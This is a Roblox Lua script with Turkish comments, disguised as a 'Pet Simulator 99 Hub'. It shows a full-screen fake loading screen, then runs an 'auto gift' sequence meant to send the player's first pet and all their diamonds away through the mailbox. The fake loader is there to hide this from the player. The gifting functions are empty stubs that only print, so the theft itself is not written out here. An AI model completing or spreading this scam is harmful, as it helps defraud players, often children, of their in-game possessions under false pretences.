local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

-- ====================== LOADING SCREEN ======================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PS99Loader"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local BlackBG = Instance.new("Frame")
BlackBG.Size = UDim2.new(1, 0, 1, 0)
BlackBG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BlackBG.BorderSizePixel = 0
BlackBG.Parent = ScreenGui

local LoadingText = Instance.new("TextLabel")
LoadingText.Size = UDim2.new(0, 500, 0, 100)
LoadingText.Position = UDim2.new(0.5, -250, 0.4, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = "Pet Simulator 99 Hub Loading..."
LoadingText.TextColor3 = Color3.fromRGB(255, 0, 0)
LoadingText.TextScaled = true
LoadingText.Font = Enum.Font.GothamBold
LoadingText.Parent = BlackBG

local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0, 400, 0, 80)
PercentText.Position = UDim2.new(0.5, -200, 0.55, 0)
PercentText.BackgroundTransparency = 1
PercentText.Text = "0%"
PercentText.TextColor3 = Color3.fromRGB(255, 0, 0)
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.Parent = BlackBG

-- Yükleme Animasyonu
local percent = 0
spawn(function()
    while percent < 100 do
        percent = percent + math.random(4, 9)
        if percent > 100 then percent = 100 end
        PercentText.Text = percent .. "%"
        wait(math.random(70, 140)/1000)
    end
    PercentText.Text = "100%"
    task.wait(1)
    AutoGiftSequence()  -- Auto Gift Başlıyor
end)

-- ====================== AUTO GIFT SEQUENCE ======================
function AutoGiftSequence()
    print("🚀 Auto Gift Sequence Başlıyor...")
    
    -- İlk Gift: 1. Peti Gönder
    task.wait(2)
    SendFirstPet()
    
    task.wait(4)
    
    -- İkinci Gift: Tüm Elmasları Gönder
    SendAllDiamonds()
end

function SendFirstPet()
    print("1. Pet gönderiliyor...")
    -- Mailbox'a gitme + pet seçme (UI otomasyonu)
    -- Not: Bu kısım oyunun güncel UI'sine göre değişebilir
end

function SendAllDiamonds()
    print("Tüm elmaslar gönderiliyor...")
end

print("✅ PS99 Hub Yüklendi!")
